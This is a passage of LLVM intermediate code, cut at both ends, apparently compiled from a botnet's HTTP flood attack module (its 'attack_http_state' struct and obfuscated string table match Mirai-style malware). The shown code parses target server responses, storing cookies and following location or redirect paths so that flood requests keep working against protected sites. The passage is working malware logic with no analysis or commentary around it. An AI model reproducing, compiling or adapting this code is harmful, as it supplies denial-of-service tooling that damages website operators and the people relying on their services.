  %1257 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1256, i32 0, i32 14
  store i32 %1255, i32* %1257, align 4
  br label %1258

; <label>:1258:                                   ; preds = %1248, %1228
  br label %1262

; <label>:1259:                                   ; preds = %1208
  %1260 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1260, i32 0, i32 14
  store i32 0, i32* %1261, align 4
  br label %1262

; <label>:1262:                                   ; preds = %1259, %1258
  store i32 0, i32* %37, align 4
  br label %1263

; <label>:1263:                                   ; preds = %1438, %1262
  %1264 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1265 = load i32, i32* %37, align 4
  %1266 = sext i32 %1265 to i64
  %1267 = getelementptr inbounds i8, i8* %1264, i64 %1266
  %1268 = load i32, i32* %12, align 4
  %1269 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1270 = call i32 @util_stristr(i8* %1267, i32 %1268, i8* %1269)
  %1271 = icmp ne i32 %1270, -1
  br i1 %1271, label %1272, label %1277

; <label>:1272:                                   ; preds = %1263
  %1273 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1273, i32 0, i32 15
  %1275 = load i32, i32* %1274, align 4
  %1276 = icmp slt i32 %1275, 5
  br label %1277

; <label>:1277:                                   ; preds = %1272, %1263
  %1278 = phi i1 [ false, %1263 ], [ %1276, %1272 ]
  br i1 %1278, label %1279, label %1442

; <label>:1279:                                   ; preds = %1277
  %1280 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1281 = load i32, i32* %37, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds i8, i8* %1280, i64 %1282
  %1284 = load i32, i32* %12, align 4
  %1285 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1286 = call i32 @util_stristr(i8* %1283, i32 %1284, i8* %1285)
  store i32 %1286, i32* %47, align 4
  %1287 = load i32, i32* %37, align 4
  %1288 = load i32, i32* %47, align 4
  %1289 = add nsw i32 %1287, %1288
  %1290 = sext i32 %1289 to i64
  %1291 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1290
  %1292 = load i8, i8* %1291, align 1
  %1293 = sext i8 %1292 to i32
  %1294 = icmp eq i32 %1293, 32
  br i1 %1294, label %1295, label %1298

; <label>:1295:                                   ; preds = %1279
  %1296 = load i32, i32* %47, align 4
  %1297 = add nsw i32 %1296, 1
  store i32 %1297, i32* %47, align 4
  br label %1298

; <label>:1298:                                   ; preds = %1295, %1279
  %1299 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1300 = load i32, i32* %37, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds i8, i8* %1299, i64 %1301
  %1303 = load i32, i32* %47, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds i8, i8* %1302, i64 %1304
  %1306 = load i32, i32* %12, align 4
  %1307 = load i32, i32* %37, align 4
  %1308 = sub nsw i32 %1306, %1307
  %1309 = load i32, i32* %47, align 4
  %1310 = sub nsw i32 %1308, %1309
  %1311 = call i32 @util_memsearch(i8* %1305, i32 %1310, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1311, i32* %48, align 4
  %1312 = load i32, i32* %48, align 4
  %1313 = icmp ne i32 %1312, -1
  br i1 %1313, label %1314, label %1438

; <label>:1314:                                   ; preds = %1298
  %1315 = load i32, i32* %37, align 4
  %1316 = load i32, i32* %47, align 4
  %1317 = add nsw i32 %1315, %1316
  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1318
  store i8* %1319, i8** %49, align 8
  %1320 = load i32, i32* %48, align 4
  %1321 = icmp sge i32 %1320, 2
  br i1 %1321, label %1322, label %1325

; <label>:1322:                                   ; preds = %1314
  %1323 = load i32, i32* %48, align 4
  %1324 = sub nsw i32 %1323, 2
  store i32 %1324, i32* %48, align 4
  br label %1325

; <label>:1325:                                   ; preds = %1322, %1314
  %1326 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1327 = load i32, i32* %37, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = getelementptr inbounds i8, i8* %1326, i64 %1328
  %1330 = load i32, i32* %47, align 4
  %1331 = sext i32 %1330 to i64
  %1332 = getelementptr inbounds i8, i8* %1329, i64 %1331
  %1333 = load i32, i32* %12, align 4
  %1334 = load i32, i32* %37, align 4
  %1335 = sub nsw i32 %1333, %1334
  %1336 = load i32, i32* %47, align 4
  %1337 = sub nsw i32 %1335, %1336
  %1338 = call i32 @util_memsearch(i8* %1332, i32 %1337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1339 = icmp sgt i32 %1338, 0
  br i1 %1339, label %1340, label %1355

; <label>:1340:                                   ; preds = %1325
  %1341 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1342 = load i32, i32* %37, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds i8, i8* %1341, i64 %1343
  %1345 = load i32, i32* %47, align 4
  %1346 = sext i32 %1345 to i64
  %1347 = getelementptr inbounds i8, i8* %1344, i64 %1346
  %1348 = load i32, i32* %12, align 4
  %1349 = load i32, i32* %37, align 4
  %1350 = sub nsw i32 %1348, %1349
  %1351 = load i32, i32* %47, align 4
  %1352 = sub nsw i32 %1350, %1351
  %1353 = call i32 @util_memsearch(i8* %1347, i32 %1352, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1354 = sub nsw i32 %1353, 1
  store i32 %1354, i32* %48, align 4
  br label %1355

; <label>:1355:                                   ; preds = %1340, %1325
  %1356 = load i32, i32* %37, align 4
  %1357 = load i32, i32* %47, align 4
  %1358 = add nsw i32 %1356, %1357
  %1359 = load i32, i32* %48, align 4
  %1360 = add nsw i32 %1358, %1359
  %1361 = sext i32 %1360 to i64
  %1362 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1361
  store i8 0, i8* %1362, align 1
  store i32 0, i32* %10, align 4
  br label %1363

; <label>:1363:                                   ; preds = %1378, %1355
  %1364 = load i32, i32* %10, align 4
  %1365 = load i8*, i8** %49, align 8
  %1366 = call i32 @util_strlen(i8* %1365)
  %1367 = icmp slt i32 %1364, %1366
  br i1 %1367, label %1368, label %1381

; <label>:1368:                                   ; preds = %1363
  %1369 = load i8*, i8** %49, align 8
  %1370 = load i32, i32* %10, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds i8, i8* %1369, i64 %1371
  %1373 = load i8, i8* %1372, align 1
  %1374 = sext i8 %1373 to i32
  %1375 = icmp eq i32 %1374, 61
  br i1 %1375, label %1376, label %1377

; <label>:1376:                                   ; preds = %1368
  br label %1381

; <label>:1377:                                   ; preds = %1368
  br label %1378

; <label>:1378:                                   ; preds = %1377
  %1379 = load i32, i32* %10, align 4
  %1380 = add nsw i32 %1379, 1
  store i32 %1380, i32* %10, align 4
  br label %1363

; <label>:1381:                                   ; preds = %1376, %1363
  %1382 = load i8*, i8** %49, align 8
  %1383 = load i32, i32* %10, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds i8, i8* %1382, i64 %1384
  %1386 = load i8, i8* %1385, align 1
  %1387 = sext i8 %1386 to i32
  %1388 = icmp eq i32 %1387, 61
  br i1 %1388, label %1389, label %1437

; <label>:1389:                                   ; preds = %1381
  %1390 = load i32, i32* %10, align 4
  store i32 %1390, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1391

; <label>:1391:                                   ; preds = %1410, %1389
  %1392 = load i32, i32* %10, align 4
  %1393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1393, i32 0, i32 15
  %1395 = load i32, i32* %1394, align 4
  %1396 = icmp slt i32 %1392, %1395
  br i1 %1396, label %1397, label %1413

; <label>:1397:                                   ; preds = %1391
  %1398 = load i8*, i8** %49, align 8
  %1399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1399, i32 0, i32 16
  %1401 = load i32, i32* %10, align 4
  %1402 = sext i32 %1401 to i64
  %1403 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1400, i64 0, i64 %1402
  %1404 = getelementptr inbounds [128 x i8], [128 x i8]* %1403, i32 0, i32 0
  %1405 = load i32, i32* %50, align 4
  %1406 = call signext i8 @util_strncmp(i8* %1398, i8* %1404, i32 %1405)
  %1407 = icmp ne i8 %1406, 0
  br i1 %1407, label %1408, label %1409

; <label>:1408:                                   ; preds = %1397
  store i32 1, i32* %51, align 4
  br label %1413

; <label>:1409:                                   ; preds = %1397
  br label %1410

; <label>:1410:                                   ; preds = %1409
  %1411 = load i32, i32* %10, align 4
  %1412 = add nsw i32 %1411, 1
  store i32 %1412, i32* %10, align 4
  br label %1391

; <label>:1413:                                   ; preds = %1408, %1391
  %1414 = load i32, i32* %51, align 4
  %1415 = icmp ne i32 %1414, 0
  br i1 %1415, label %1436, label %1416

; <label>:1416:                                   ; preds = %1413
  %1417 = load i8*, i8** %49, align 8
  %1418 = call i32 @util_strlen(i8* %1417)
  %1419 = icmp slt i32 %1418, 128
  br i1 %1419, label %1420, label %1435

; <label>:1420:                                   ; preds = %1416
  %1421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1421, i32 0, i32 16
  %1423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1423, i32 0, i32 15
  %1425 = load i32, i32* %1424, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1422, i64 0, i64 %1426
  %1428 = getelementptr inbounds [128 x i8], [128 x i8]* %1427, i32 0, i32 0
  %1429 = load i8*, i8** %49, align 8
  %1430 = call i32 @util_strcpy(i8* %1428, i8* %1429)
  %1431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1431, i32 0, i32 15
  %1433 = load i32, i32* %1432, align 4
  %1434 = add nsw i32 %1433, 1
  store i32 %1434, i32* %1432, align 4
  br label %1435

; <label>:1435:                                   ; preds = %1420, %1416
  br label %1436

; <label>:1436:                                   ; preds = %1435, %1413
  br label %1437

; <label>:1437:                                   ; preds = %1436, %1381
  br label %1438

; <label>:1438:                                   ; preds = %1437, %1298
  %1439 = load i32, i32* %47, align 4
  %1440 = load i32, i32* %37, align 4
  %1441 = add nsw i32 %1440, %1439
  store i32 %1441, i32* %37, align 4
  br label %1263

; <label>:1442:                                   ; preds = %1277
  %1443 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1444 = load i32, i32* %12, align 4
  %1445 = call i8* @table_retrieve_val(i32 54, i32* null)
  %1446 = call i32 @util_stristr(i8* %1443, i32 %1444, i8* %1445)
  %1447 = icmp ne i32 %1446, -1
  br i1 %1447, label %1448, label %1627

; <label>:1448:                                   ; preds = %1442
  %1449 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1450 = load i32, i32* %12, align 4
  %1451 = call i8* @table_retrieve_val(i32 54, i32* null)
  %1452 = call i32 @util_stristr(i8* %1449, i32 %1450, i8* %1451)
  store i32 %1452, i32* %52, align 4
  %1453 = load i32, i32* %52, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1454
  %1456 = load i8, i8* %1455, align 1
  %1457 = sext i8 %1456 to i32
  %1458 = icmp eq i32 %1457, 32
  br i1 %1458, label %1459, label %1462

; <label>:1459:                                   ; preds = %1448
  %1460 = load i32, i32* %52, align 4
  %1461 = add nsw i32 %1460, 1
  store i32 %1461, i32* %52, align 4
  br label %1462

; <label>:1462:                                   ; preds = %1459, %1448
  %1463 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1464 = load i32, i32* %52, align 4
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds i8, i8* %1463, i64 %1465
  %1467 = load i32, i32* %12, align 4
  %1468 = load i32, i32* %52, align 4
  %1469 = sub nsw i32 %1467, %1468
  %1470 = call i32 @util_memsearch(i8* %1466, i32 %1469, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1470, i32* %53, align 4
  %1471 = load i32, i32* %53, align 4
  %1472 = icmp ne i32 %1471, -1
  br i1 %1472, label %1473, label %1626

; <label>:1473:                                   ; preds = %1462
  %1474 = load i32, i32* %52, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1475
  store i8* %1476, i8** %54, align 8
  %1477 = load i32, i32* %53, align 4
  %1478 = icmp sge i32 %1477, 2
  br i1 %1478, label %1479, label %1482

; <label>:1479:                                   ; preds = %1473
  %1480 = load i32, i32* %53, align 4
  %1481 = sub nsw i32 %1480, 2
  store i32 %1481, i32* %53, align 4
  br label %1482

; <label>:1482:                                   ; preds = %1479, %1473
  %1483 = load i32, i32* %52, align 4
  %1484 = load i32, i32* %53, align 4
  %1485 = add nsw i32 %1483, %1484
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1486
  store i8 0, i8* %1487, align 1
  %1488 = load i32, i32* %53, align 4
  %1489 = add nsw i32 %1488, 1
  store i32 %1489, i32* %53, align 4
  %1490 = load i8*, i8** %54, align 8
  %1491 = load i32, i32* %53, align 4
  %1492 = call i32 @util_memsearch(i8* %1490, i32 %1491, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1493 = icmp eq i32 %1492, 4
  br i1 %1493, label %1494, label %1584

; <label>:1494:                                   ; preds = %1482
  store i32 7, i32* %10, align 4
  %1495 = load i8*, i8** %54, align 8
  %1496 = getelementptr inbounds i8, i8* %1495, i64 4
  %1497 = load i8, i8* %1496, align 1
  %1498 = sext i8 %1497 to i32
  %1499 = icmp eq i32 %1498, 115
  br i1 %1499, label %1500, label %1503

; <label>:1500:                                   ; preds = %1494
  %1501 = load i32, i32* %10, align 4
  %1502 = add nsw i32 %1501, 1
  store i32 %1502, i32* %10, align 4
  br label %1503

; <label>:1503:                                   ; preds = %1500, %1494
  %1504 = load i8*, i8** %54, align 8
  %1505 = load i8*, i8** %54, align 8
  %1506 = load i32, i32* %10, align 4
  %1507 = sext i32 %1506 to i64
  %1508 = getelementptr inbounds i8, i8* %1505, i64 %1507
  %1509 = load i32, i32* %53, align 4
  %1510 = load i32, i32* %10, align 4
  %1511 = sub nsw i32 %1509, %1510
  %1512 = sext i32 %1511 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1504, i8* %1508, i64 %1512, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1513

; <label>:1513:                                   ; preds = %1534, %1503
  %1514 = load i8*, i8** %54, align 8
  %1515 = load i32, i32* %10, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds i8, i8* %1514, i64 %1516
  %1518 = load i8, i8* %1517, align 1
  %1519 = sext i8 %1518 to i32
  %1520 = icmp ne i32 %1519, 0
  br i1 %1520, label %1521, label %1537

; <label>:1521:                                   ; preds = %1513
  %1522 = load i8*, i8** %54, align 8
  %1523 = load i32, i32* %10, align 4
  %1524 = sext i32 %1523 to i64
  %1525 = getelementptr inbounds i8, i8* %1522, i64 %1524
  %1526 = load i8, i8* %1525, align 1
  %1527 = sext i8 %1526 to i32
  %1528 = icmp eq i32 %1527, 47
  br i1 %1528, label %1529, label %1534

; <label>:1529:                                   ; preds = %1521
  %1530 = load i8*, i8** %54, align 8
  %1531 = load i32, i32* %10, align 4
  %1532 = sext i32 %1531 to i64
  %1533 = getelementptr inbounds i8, i8* %1530, i64 %1532
  store i8 0, i8* %1533, align 1
  br label %1537

; <label>:1534:                                   ; preds = %1521
  %1535 = load i32, i32* %10, align 4
  %1536 = add nsw i32 %1535, 1
  store i32 %1536, i32* %10, align 4
  br label %1513

; <label>:1537:                                   ; preds = %1529, %1513
  %1538 = load i8*, i8** %54, align 8
  %1539 = call i32 @util_strlen(i8* %1538)
  %1540 = icmp sgt i32 %1539, 0
  br i1 %1540, label %1541, label %1551

; <label>:1541:                                   ; preds = %1537
  %1542 = load i8*, i8** %54, align 8
  %1543 = call i32 @util_strlen(i8* %1542)
  %1544 = icmp slt i32 %1543, 128
  br i1 %1544, label %1545, label %1551

; <label>:1545:                                   ; preds = %1541
  %1546 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1547 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1546, i32 0, i32 7
  %1548 = getelementptr inbounds [129 x i8], [129 x i8]* %1547, i32 0, i32 0
  %1549 = load i8*, i8** %54, align 8
  %1550 = call i32 @util_strcpy(i8* %1548, i8* %1549)
  br label %1551

; <label>:1551:                                   ; preds = %1545, %1541, %1537
  %1552 = load i8*, i8** %54, align 8
  %1553 = load i32, i32* %10, align 4
  %1554 = add nsw i32 %1553, 1
  %1555 = sext i32 %1554 to i64
  %1556 = getelementptr inbounds i8, i8* %1552, i64 %1555
  %1557 = call i32 @util_strlen(i8* %1556)
  %1558 = icmp slt i32 %1557, 256
  br i1 %1558, label %1559, label %1583

; <label>:1559:                                   ; preds = %1551
  %1560 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1560, i32 0, i32 6
  %1562 = getelementptr inbounds [257 x i8], [257 x i8]* %1561, i32 0, i32 0
  %1563 = getelementptr inbounds i8, i8* %1562, i64 1
  call void @util_zero(i8* %1563, i32 255)
  %1564 = load i8*, i8** %54, align 8
  %1565 = load i32, i32* %10, align 4
  %1566 = add nsw i32 %1565, 1
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds i8, i8* %1564, i64 %1567
  %1569 = call i32 @util_strlen(i8* %1568)
  %1570 = icmp sgt i32 %1569, 0
  br i1 %1570, label %1571, label %1582

; <label>:1571:                                   ; preds = %1559
  %1572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1572, i32 0, i32 6
  %1574 = getelementptr inbounds [257 x i8], [257 x i8]* %1573, i32 0, i32 0
  %1575 = getelementptr inbounds i8, i8* %1574, i64 1
  %1576 = load i8*, i8** %54, align 8
  %1577 = load i32, i32* %10, align 4
  %1578 = add nsw i32 %1577, 1
  %1579 = sext i32 %1578 to i64
  %1580 = getelementptr inbounds i8, i8* %1576, i64 %1579
  %1581 = call i32 @util_strcpy(i8* %1575, i8* %1580)
  br label %1582

; <label>:1582:                                   ; preds = %1571, %1559
  br label %1583

; <label>:1583:                                   ; preds = %1582, %1551
  br label %1623

; <label>:1584:                                   ; preds = %1482
  %1585 = load i8*, i8** %54, align 8
  %1586 = getelementptr inbounds i8, i8* %1585, i64 0
  %1587 = load i8, i8* %1586, align 1
  %1588 = sext i8 %1587 to i32
  %1589 = icmp eq i32 %1588, 47
  br i1 %1589, label %1590, label %1622

; <label>:1590:                                   ; preds = %1584
  %1591 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1592 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1591, i32 0, i32 6
  %1593 = getelementptr inbounds [257 x i8], [257 x i8]* %1592, i32 0, i32 0
  %1594 = getelementptr inbounds i8, i8* %1593, i64 1
  call void @util_zero(i8* %1594, i32 255)
  %1595 = load i8*, i8** %54, align 8
  %1596 = load i32, i32* %10, align 4
  %1597 = add nsw i32 %1596, 1
  %1598 = sext i32 %1597 to i64
  %1599 = getelementptr inbounds i8, i8* %1595, i64 %1598
  %1600 = call i32 @util_strlen(i8* %1599)
  %1601 = icmp sgt i32 %1600, 0
  br i1 %1601, label %1602, label %1621

; <label>:1602:                                   ; preds = %1590
  %1603 = load i8*, i8** %54, align 8
  %1604 = load i32, i32* %10, align 4
  %1605 = add nsw i32 %1604, 1
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds i8, i8* %1603, i64 %1606
  %1608 = call i32 @util_strlen(i8* %1607)
  %1609 = icmp slt i32 %1608, 256
  br i1 %1609, label %1610, label %1621

; <label>:1610:                                   ; preds = %1602
  %1611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1611, i32 0, i32 6
  %1613 = getelementptr inbounds [257 x i8], [257 x i8]* %1612, i32 0, i32 0
  %1614 = getelementptr inbounds i8, i8* %1613, i64 1
  %1615 = load i8*, i8** %54, align 8
  %1616 = load i32, i32* %10, align 4
  %1617 = add nsw i32 %1616, 1
  %1618 = sext i32 %1617 to i64
  %1619 = getelementptr inbounds i8, i8* %1615, i64 %1618
  %1620 = call i32 @util_strcpy(i8* %1614, i8* %1619)
  br label %1621

; <label>:1621:                                   ; preds = %1610, %1602, %1590
  br label %1622

; <label>:1622:                                   ; preds = %1621, %1584
  br label %1623

; <label>:1623:                                   ; preds = %1622, %1583
  %1624 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1625 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1624, i32 0, i32 1
  store i8 1, i8* %1625, align 4
  br label %2441

; <label>:1626:                                   ; preds = %1462
  br label %1627

; <label>:1627:                                   ; preds = %1626, %1442
  %1628 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1629 = load i32, i32* %12, align 4
  %1630 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1631 = call i32 @util_stristr(i8* %1628, i32 %1629, i8* %1630)
  %1632 = icmp ne i32 %1631, -1
  br i1 %1632, label %1633, label %1963

; <label>:1633:                                   ; preds = %1627
  %1634 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1635 = load i32, i32* %12, align 4
  %1636 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1637 = call i32 @util_stristr(i8* %1634, i32 %1635, i8* %1636)
  store i32 %1637, i32* %55, align 4
  %1638 = load i32, i32* %55, align 4
  %1639 = sext i32 %1638 to i64
  %1640 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1639
  %1641 = load i8, i8* %1640, align 1
  %1642 = sext i8 %1641 to i32
  %1643 = icmp eq i32 %1642, 32
  br i1 %1643, label %1644, label %1647

; <label>:1644:                                   ; preds = %1633
  %1645 = load i32, i32* %55, align 4
  %1646 = add nsw i32 %1645, 1
  store i32 %1646, i32* %55, align 4
  br label %1647

; <label>:1647:                                   ; preds = %1644, %1633
  %1648 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1649 = load i32, i32* %55, align 4
  %1650 = sext i32 %1649 to i64
  %1651 = getelementptr inbounds i8, i8* %1648, i64 %1650
  %1652 = load i32, i32* %12, align 4
  %1653 = load i32, i32* %55, align 4
  %1654 = sub nsw i32 %1652, %1653
  %1655 = call i32 @util_memsearch(i8* %1651, i32 %1654, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1655, i32* %56, align 4
  %1656 = load i32, i32* %56, align 4
  %1657 = icmp ne i32 %1656, -1
  br i1 %1657, label %1658, label %1962

; <label>:1658:                                   ; preds = %1647
  %1659 = load i32, i32* %55, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1660
  store i8* %1661, i8** %57, align 8
  %1662 = load i32, i32* %56, align 4
  %1663 = icmp sge i32 %1662, 2
  br i1 %1663, label %1664, label %1667

; <label>:1664:                                   ; preds = %1658
  %1665 = load i32, i32* %56, align 4
  %1666 = sub nsw i32 %1665, 2
  store i32 %1666, i32* %56, align 4
  br label %1667

; <label>:1667:                                   ; preds = %1664, %1658
  %1668 = load i32, i32* %55, align 4
  %1669 = load i32, i32* %56, align 4
  %1670 = add nsw i32 %1668, %1669
  %1671 = sext i32 %1670 to i64
  %1672 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1671
  store i8 0, i8* %1672, align 1
  %1673 = load i32, i32* %56, align 4
  %1674 = add nsw i32 %1673, 1
  store i32 %1674, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1675

; <label>:1675:                                   ; preds = %1701, %1667
  %1676 = load i8*, i8** %57, align 8
  %1677 = load i32, i32* %10, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds i8, i8* %1676, i64 %1678
  %1680 = load i8, i8* %1679, align 1
  %1681 = sext i8 %1680 to i32
  %1682 = icmp ne i32 %1681, 0
  br i1 %1682, label %1683, label %1699

; <label>:1683:                                   ; preds = %1675
  %1684 = load i8*, i8** %57, align 8
  %1685 = load i32, i32* %10, align 4
  %1686 = sext i32 %1685 to i64
  %1687 = getelementptr inbounds i8, i8* %1684, i64 %1686
  %1688 = load i8, i8* %1687, align 1
  %1689 = sext i8 %1688 to i32
  %1690 = icmp sge i32 %1689, 48
  br i1 %1690, label %1691, label %1699

; <label>:1691:                                   ; preds = %1683
  %1692 = load i8*, i8** %57, align 8
  %1693 = load i32, i32* %10, align 4
  %1694 = sext i32 %1693 to i64
  %1695 = getelementptr inbounds i8, i8* %1692, i64 %1694
  %1696 = load i8, i8* %1695, align 1
  %1697 = sext i8 %1696 to i32
  %1698 = icmp sle i32 %1697, 57
  br label %1699

; <label>:1699:                                   ; preds = %1691, %1683, %1675
  %1700 = phi i1 [ false, %1683 ], [ false, %1675 ], [ %1698, %1691 ]
  br i1 %1700, label %1701, label %1704

; <label>:1701:                                   ; preds = %1699
  %1702 = load i32, i32* %10, align 4
  %1703 = add nsw i32 %1702, 1
  store i32 %1703, i32* %10, align 4
  br label %1675

; <label>:1704:                                   ; preds = %1699
  %1705 = load i8*, i8** %57, align 8
  %1706 = load i32, i32* %10, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds i8, i8* %1705, i64 %1707
  %1709 = load i8, i8* %1708, align 1
  %1710 = sext i8 %1709 to i32
  %1711 = icmp ne i32 %1710, 0
  br i1 %1711, label %1712, label %1961

; <label>:1712:                                   ; preds = %1704
  store i32 0, i32* %58, align 4
  %1713 = load i8*, i8** %57, align 8
  %1714 = load i32, i32* %10, align 4
  %1715 = sext i32 %1714 to i64
  %1716 = getelementptr inbounds i8, i8* %1713, i64 %1715
  store i8 0, i8* %1716, align 1
  %1717 = load i32, i32* %10, align 4
  %1718 = add nsw i32 %1717, 1
  store i32 %1718, i32* %10, align 4
  %1719 = load i8*, i8** %57, align 8
  %1720 = load i32, i32* %10, align 4
  %1721 = sext i32 %1720 to i64
  %1722 = getelementptr inbounds i8, i8* %1719, i64 %1721
  %1723 = load i8, i8* %1722, align 1
  %1724 = sext i8 %1723 to i32
  %1725 = icmp eq i32 %1724, 32
  br i1 %1725, label %1726, label %1729

; <label>:1726:                                   ; preds = %1712
  %1727 = load i32, i32* %10, align 4
  %1728 = add nsw i32 %1727, 1
  store i32 %1728, i32* %10, align 4
  br label %1729

; <label>:1729:                                   ; preds = %1726, %1712
  %1730 = load i8*, i8** %57, align 8
  %1731 = load i32, i32* %10, align 4
  %1732 = sext i32 %1731 to i64
  %1733 = getelementptr inbounds i8, i8* %1730, i64 %1732
  %1734 = load i8*, i8** %57, align 8
  %1735 = load i32, i32* %10, align 4
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds i8, i8* %1734, i64 %1736
  %1738 = call i32 @util_strlen(i8* %1737)
  %1739 = call i32 @util_stristr(i8* %1733, i32 %1738, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1740 = icmp ne i32 %1739, -1
  br i1 %1740, label %1741, label %1754

; <label>:1741:                                   ; preds = %1729
  %1742 = load i8*, i8** %57, align 8
  %1743 = load i32, i32* %10, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds i8, i8* %1742, i64 %1744
  %1746 = load i8*, i8** %57, align 8
  %1747 = load i32, i32* %10, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds i8, i8* %1746, i64 %1748
  %1750 = call i32 @util_strlen(i8* %1749)
  %1751 = call i32 @util_stristr(i8* %1745, i32 %1750, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1752 = load i32, i32* %10, align 4
  %1753 = add nsw i32 %1752, %1751
  store i32 %1753, i32* %10, align 4
  br label %1754

; <label>:1754:                                   ; preds = %1741, %1729
  %1755 = load i8*, i8** %57, align 8
  %1756 = load i32, i32* %10, align 4
  %1757 = sext i32 %1756 to i64
  %1758 = getelementptr inbounds i8, i8* %1755, i64 %1757
  %1759 = load i8, i8* %1758, align 1
  %1760 = sext i8 %1759 to i32
  %1761 = icmp eq i32 %1760, 34
